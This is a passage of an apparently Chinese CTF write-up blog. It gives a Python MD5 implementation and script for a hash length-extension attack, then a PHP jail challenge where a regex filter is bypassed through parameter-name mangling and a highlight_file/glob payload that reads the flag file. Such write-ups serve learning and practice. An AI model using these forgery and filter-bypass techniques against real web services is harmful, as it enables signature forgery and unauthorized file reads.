my_md5.deal_rawInputMsg(test)</span><br><span class="line">r = my_md5.deal_rawInputMsg(secret)</span><br><span class="line">inp = s[<span class="built_in">len</span>(r):]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;填充完的数据为:&#x27;</span> + urllib.quote(test) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;扩充完的数据为(16进制):&#x27;</span> + s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;截取最后分组的数据(16进制):&#x27;</span> + inp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;最终填充结果为:&#x27;</span> + <span class="built_in">bytes</span>(test).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;填充后的md5为:&quot;</span> + my_md5.run_md5(s1, s2, s3, s4, inp))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line">my_md5.py!</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line"><span class="comment"># theory reference:</span></span><br><span class="line"><span class="comment">#   blog：</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/adidala/article/details/28677393</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span></span><br><span class="line"><span class="comment">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span></span><br><span class="line"><span class="comment">#   RFC1321：</span></span><br><span class="line"><span class="comment">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span></span><br><span class="line"><span class="comment">##############################################################################</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genMsgLengthDescriptor</span>(<span class="params">msg_bitsLenth</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ---args:</span></span><br><span class="line"><span class="string">            msg_bitsLenth : the bits length of raw message</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;struct&quot;</span>).pack(<span class="string">&quot;&gt;Q&quot;</span>, msg_bitsLenth).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_8bytes</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 16 , i.e.8bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform raw message descriptor to little-endian</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    hex_str = <span class="string">&quot;%016x&quot;</span> % <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(hex_str) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;struct&quot;</span>).pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="built_in">int</span>(hex_str, <span class="number">16</span>)).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_4bytes</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 8 , i.e.4bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform 4 bytes message block to little-endian</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    hex_str = <span class="string">&quot;%08x&quot;</span> % <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(hex_str) == <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;struct&quot;</span>).pack(<span class="string">&quot;&lt;L&quot;</span>, <span class="built_in">int</span>(hex_str, <span class="number">16</span>)).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deal_rawInputMsg</span>(<span class="params">input_msg</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            input_msg : inputed a ascii-encoded string</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            a hex-encoded string which can be inputed to mathematical transformation function.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    ascii_list = [x.encode(<span class="string">&quot;hex&quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> input_msg]</span><br><span class="line">    length_msg_bytes = <span class="built_in">len</span>(ascii_list)</span><br><span class="line">    length_msg_bits = <span class="built_in">len</span>(ascii_list) * <span class="number">8</span></span><br><span class="line">    <span class="comment"># padding</span></span><br><span class="line">    ascii_list.append(<span class="string">&#x27;80&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">        ascii_list.append(<span class="string">&#x27;00&#x27;</span>)</span><br><span class="line">    <span class="comment"># add Descriptor</span></span><br><span class="line">    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(ascii_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getM16</span>(<span class="params">hex_str, operatingBlockNum</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str : a hex-encoded string with length in integral multiple of 512bits</span></span><br><span class="line"><span class="string">            operatingBlockNum : message block number which is being operated , greater than 1</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            M : result of splited 64bytes into 4*16 message blocks with little-endian</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    M = [<span class="built_in">int</span>(reverse_hex_4bytes(hex_str[i:(i + <span class="number">8</span>)]), <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span></span><br><span class="line">         xrange(<span class="number">128</span> * (operatingBlockNum - <span class="number">1</span>), <span class="number">128</span> * operatingBlockNum, <span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    result = (<span class="built_in">int</span>(<span class="number">4294967296</span> * <span class="built_in">abs</span>(<span class="built_in">__import__</span>(<span class="string">&quot;math&quot;</span>).sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义每轮中用到的函数</span></span><br><span class="line"><span class="comment"># RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">RL = L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FF</span>(<span class="params">a, b, c, d, x, s, ac</span>):</span><br><span class="line">    a = (a + F((b), (c), (d)) + (x) + (ac) &amp; <span class="number">0xffffffff</span>) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL((a), (s)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GG</span>(<span class="params">a, b, c, d, x, s, ac</span>):</span><br><span class="line">    a = (a + G((b), (c), (d)) + (x) + (ac) &amp; <span class="number">0xffffffff</span>) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL((a), (s)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HH</span>(<span class="params">a, b, c, d, x, s, ac</span>):</span><br><span class="line">    a = (a + H((b), (c), (d)) + (x) + (ac) &amp; <span class="number">0xffffffff</span>) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL((a), (s)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">II</span>(<span class="params">a, b, c, d, x, s, ac</span>):</span><br><span class="line">    a = (a + I((b), (c), (d)) + (x) + (ac) &amp; <span class="number">0xffffffff</span>) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL((a), (s)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_md5</span>(<span class="params">A, B, C, D</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;&quot;</span>.join(<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).findall(<span class="string">r&quot;..&quot;</span>, <span class="string">&quot;%08x&quot;</span> % i)[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> (A, B, C, D)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_md5</span>(<span class="params">A=<span class="number">0x67452301</span>, B=<span class="number">0xefcdab89</span>, C=<span class="number">0x98badcfe</span>, D=<span class="number">0x10325476</span>, readyMsg=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    a = A</span><br><span class="line">    b = B</span><br><span class="line">    c = C</span><br><span class="line">    d = D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(readyMsg) / <span class="number">128</span>):</span><br><span class="line">        M = getM16(readyMsg, i + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">exec</span> <span class="string">&quot;M&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;=M[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span></span><br><span class="line">        <span class="comment"># First round</span></span><br><span class="line">        a = FF(a, b, c, d, M0, <span class="number">7</span>, <span class="number">0xd76aa478L</span>)</span><br><span class="line">        d = FF(d, a, b, c, M1, <span class="number">12</span>, <span class="number">0xe8c7b756L</span>)</span><br><span class="line">        c = FF(c, d, a, b, M2, <span class="number">17</span>, <span class="number">0x242070dbL</span>)</span><br><span class="line">        b = FF(b, c, d, a, M3, <span class="number">22</span>, <span class="number">0xc1bdceeeL</span>)</span><br><span class="line">        a = FF(a, b, c, d, M4, <span class="number">7</span>, <span class="number">0xf57c0fafL</span>)</span><br><span class="line">        d = FF(d, a, b, c, M5, <span class="number">12</span>, <span class="number">0x4787c62aL</span>)</span><br><span class="line">        c = FF(c, d, a, b, M6, <span class="number">17</span>, <span class="number">0xa8304613L</span>)</span><br><span class="line">        b = FF(b, c, d, a, M7, <span class="number">22</span>, <span class="number">0xfd469501L</span>)</span><br><span class="line">        a = FF(a, b, c, d, M8, <span class="number">7</span>, <span class="number">0x698098d8L</span>)</span><br><span class="line">        d = FF(d, a, b, c, M9, <span class="number">12</span>, <span class="number">0x8b44f7afL</span>)</span><br><span class="line">        c = FF(c, d, a, b, M10, <span class="number">17</span>, <span class="number">0xffff5bb1L</span>)</span><br><span class="line">        b = FF(b, c, d, a, M11, <span class="number">22</span>, <span class="number">0x895cd7beL</span>)</span><br><span class="line">        a = FF(a, b, c, d, M12, <span class="number">7</span>, <span class="number">0x6b901122L</span>)</span><br><span class="line">        d = FF(d, a, b, c, M13, <span class="number">12</span>, <span class="number">0xfd987193L</span>)</span><br><span class="line">        c = FF(c, d, a, b, M14, <span class="number">17</span>, <span class="number">0xa679438eL</span>)</span><br><span class="line">        b = FF(b, c, d, a, M15, <span class="number">22</span>, <span class="number">0x49b40821L</span>)</span><br><span class="line">        <span class="comment"># Second round</span></span><br><span class="line">        a = GG(a, b, c, d, M1, <span class="number">5</span>, <span class="number">0xf61e2562L</span>)</span><br><span class="line">        d = GG(d, a, b, c, M6, <span class="number">9</span>, <span class="number">0xc040b340L</span>)</span><br><span class="line">        c = GG(c, d, a, b, M11, <span class="number">14</span>, <span class="number">0x265e5a51L</span>)</span><br><span class="line">        b = GG(b, c, d, a, M0, <span class="number">20</span>, <span class="number">0xe9b6c7aaL</span>)</span><br><span class="line">        a = GG(a, b, c, d, M5, <span class="number">5</span>, <span class="number">0xd62f105dL</span>)</span><br><span class="line">        d = GG(d, a, b, c, M10, <span class="number">9</span>, <span class="number">0x02441453L</span>)</span><br><span class="line">        c = GG(c, d, a, b, M15, <span class="number">14</span>, <span class="number">0xd8a1e681L</span>)</span><br><span class="line">        b = GG(b, c, d, a, M4, <span class="number">20</span>, <span class="number">0xe7d3fbc8L</span>)</span><br><span class="line">        a = GG(a, b, c, d, M9, <span class="number">5</span>, <span class="number">0x21e1cde6L</span>)</span><br><span class="line">        d = GG(d, a, b, c, M14, <span class="number">9</span>, <span class="number">0xc33707d6L</span>)</span><br><span class="line">        c = GG(c, d, a, b, M3, <span class="number">14</span>, <span class="number">0xf4d50d87L</span>)</span><br><span class="line">        b = GG(b, c, d, a, M8, <span class="number">20</span>, <span class="number">0x455a14edL</span>)</span><br><span class="line">        a = GG(a, b, c, d, M13, <span class="number">5</span>, <span class="number">0xa9e3e905L</span>)</span><br><span class="line">        d = GG(d, a, b, c, M2, <span class="number">9</span>, <span class="number">0xfcefa3f8L</span>)</span><br><span class="line">        c = GG(c, d, a, b, M7, <span class="number">14</span>, <span class="number">0x676f02d9L</span>)</span><br><span class="line">        b = GG(b, c, d, a, M12, <span class="number">20</span>, <span class="number">0x8d2a4c8aL</span>)</span><br><span class="line">        <span class="comment"># Third round</span></span><br><span class="line">        a = HH(a, b, c, d, M5, <span class="number">4</span>, <span class="number">0xfffa3942L</span>)</span><br><span class="line">        d = HH(d, a, b, c, M8, <span class="number">11</span>, <span class="number">0x8771f681L</span>)</span><br><span class="line">        c = HH(c, d, a, b, M11, <span class="number">16</span>, <span class="number">0x6d9d6122L</span>)</span><br><span class="line">        b = HH(b, c, d, a, M14, <span class="number">23</span>, <span class="number">0xfde5380c</span>)</span><br><span class="line">        a = HH(a, b, c, d, M1, <span class="number">4</span>, <span class="number">0xa4beea44L</span>)</span><br><span class="line">        d = HH(d, a, b, c, M4, <span class="number">11</span>, <span class="number">0x4bdecfa9L</span>)</span><br><span class="line">        c = HH(c, d, a, b, M7, <span class="number">16</span>, <span class="number">0xf6bb4b60L</span>)</span><br><span class="line">        b = HH(b, c, d, a, M10, <span class="number">23</span>, <span class="number">0xbebfbc70L</span>)</span><br><span class="line">        a = HH(a, b, c, d, M13, <span class="number">4</span>, <span class="number">0x289b7ec6L</span>)</span><br><span class="line">        d = HH(d, a, b, c, M0, <span class="number">11</span>, <span class="number">0xeaa127faL</span>)</span><br><span class="line">        c = HH(c, d, a, b, M3, <span class="number">16</span>, <span class="number">0xd4ef3085L</span>)</span><br><span class="line">        b = HH(b, c, d, a, M6, <span class="number">23</span>, <span class="number">0x04881d05L</span>)</span><br><span class="line">        a = HH(a, b, c, d, M9, <span class="number">4</span>, <span class="number">0xd9d4d039L</span>)</span><br><span class="line">        d = HH(d, a, b, c, M12, <span class="number">11</span>, <span class="number">0xe6db99e5L</span>)</span><br><span class="line">        c = HH(c, d, a, b, M15, <span class="number">16</span>, <span class="number">0x1fa27cf8L</span>)</span><br><span class="line">        b = HH(b, c, d, a, M2, <span class="number">23</span>, <span class="number">0xc4ac5665L</span>)</span><br><span class="line">        <span class="comment"># Fourth round</span></span><br><span class="line">        a = II(a, b, c, d, M0, <span class="number">6</span>, <span class="number">0xf4292244L</span>)</span><br><span class="line">        d = II(d, a, b, c, M7, <span class="number">10</span>, <span class="number">0x432aff97L</span>)</span><br><span class="line">        c = II(c, d, a, b, M14, <span class="number">15</span>, <span class="number">0xab9423a7L</span>)</span><br><span class="line">        b = II(b, c, d, a, M5, <span class="number">21</span>, <span class="number">0xfc93a039L</span>)</span><br><span class="line">        a = II(a, b, c, d, M12, <span class="number">6</span>, <span class="number">0x655b59c3L</span>)</span><br><span class="line">        d = II(d, a, b, c, M3, <span class="number">10</span>, <span class="number">0x8f0ccc92L</span>)</span><br><span class="line">        c = II(c, d, a, b, M10, <span class="number">15</span>, <span class="number">0xffeff47dL</span>)</span><br><span class="line">        b = II(b, c, d, a, M1, <span class="number">21</span>, <span class="number">0x85845dd1L</span>)</span><br><span class="line">        a = II(a, b, c, d, M8, <span class="number">6</span>, <span class="number">0x6fa87e4fL</span>)</span><br><span class="line">        d = II(d, a, b, c, M15, <span class="number">10</span>, <span class="number">0xfe2ce6e0L</span>)</span><br><span class="line">        c = II(c, d, a, b, M6, <span class="number">15</span>, <span class="number">0xa3014314L</span>)</span><br><span class="line">        b = II(b, c, d, a, M13, <span class="number">21</span>, <span class="number">0x4e0811a1L</span>)</span><br><span class="line">        a = II(a, b, c, d, M4, <span class="number">6</span>, <span class="number">0xf7537e82L</span>)</span><br><span class="line">        d = II(d, a, b, c, M11, <span class="number">10</span>, <span class="number">0xbd3af235L</span>)</span><br><span class="line">        c = II(c, d, a, b, M2, <span class="number">15</span>, <span class="number">0x2ad7d2bbL</span>)</span><br><span class="line">        b = II(b, c, d, a, M9, <span class="number">21</span>, <span class="number">0xeb86d391L</span>)</span><br><span class="line"></span><br><span class="line">        A += a</span><br><span class="line">        B += b</span><br><span class="line">        C += c</span><br><span class="line">        D += d</span><br><span class="line"></span><br><span class="line">        A = A &amp; <span class="number">0xffffffff</span></span><br><span class="line">        B = B &amp; <span class="number">0xffffffff</span></span><br><span class="line">        C = C &amp; <span class="number">0xffffffff</span></span><br><span class="line">        D = D &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        a = A</span><br><span class="line">        b = B</span><br><span class="line">        c = C</span><br><span class="line">        d = D</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%x,%x,%x,%x&quot;</span> % (a, b, c, d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> show_md5(a, b, c, d)</span><br></pre></td></tr></table></figure>

<p>md5长度扩展攻击见<a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E8%AE%B0%E5%BD%95%E4%BF%A1%E6%81%AF%E9%95%BF%E5%BA%A6">https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E8%AE%B0%E5%BD%95%E4%BF%A1%E6%81%AF%E9%95%BF%E5%BA%A6</a></p>
<h2 id="Week3-ez-php-jail"><a href="#Week3-ez-php-jail" class="headerlink" title="[Week3] ez_php_jail"></a>[Week3] ez_php_jail</h2><p>当 php 版本⼩于 8 时，GET 请求的参数名含有 <code>.</code> ，会被转为 <code>_</code> ，但是如果参数名中有 <code>[</code> ，这<br>个 <code>[ </code>会被直接转为<code>_</code> ，但是后⾯如果有 <code>.</code> ，这个 . 就不会被转为<code>_</code>。</p>
<p>过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/(`|\$|a|c|s|<span class="keyword">require</span>|<span class="keyword">include</span>)/i</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/f*&#x27;</span>);<span class="comment">#highlight_file读取文件</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">https://www.freebuf.com/articles/web/319567.html</a></p>
<p>但是上面的读取方法是无效的，引用gpt的回答</p>
<p>highlight_file(‘&#x2F;f*’); 和highlight_file(glob(“&#x2F;f*”)[0]); 都能读取文件吗？</p>
<p>在 PHP 中，<code>highlight_file</code> 函数用于高亮显示指定文件的内容。你提到的两种用法都可以读取文件，但它们的工作方式略有不同。</p>
<h3 id="1-highlight-file-f"><a href="#1-highlight-file-f" class="headerlink" title="1. highlight_file(&#39;/f*&#39;)"></a>1. <code>highlight_file(&#39;/f*&#39;)</code></h3><p>这个用法是直接传递一个字符串 <code>&#39;/f*&#39;</code> 给 <code>highlight_file</code>。然而，这种用法是无效的，因为 <code>highlight_file</code> 需要一个具体的文件路径，而不是一个模式。<code>&#39;/f*&#39;</code> 只是一个模式，PHP 不会将其解析为文件路径。因此，这种用法会导致错误。</p>
<h3 id="2-highlight-file-glob-f-0"><a href="#2-highlight-file-glob-f-0" class="headerlink" title="2. highlight_file(glob(&quot;/f*&quot;)[0])"></a>2. <code>highlight_file(glob(&quot;/f*&quot;)[0])</code></h3><p>这个用法是有效的。这里的 <code>glob(&quot;/f*&quot;)</code> 会返回一个数组，包含所有匹配 <code>/f*</code> 模式的文件路径。<code>[0]</code> 取数组中的第一个元素（即第一个匹配的文件路径），然后将其传递给 <code>highlight_file</code>。如果存在匹配的文件，这种用法将成功读取并高亮显示该文件的内容。</p>
<h2 id="Week3-滤个不停"><a href="#Week3-滤个不停" class="headerlink" title="[Week3] 滤个不停"></a>[Week3] 滤个不停</h2><p>先贴源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title 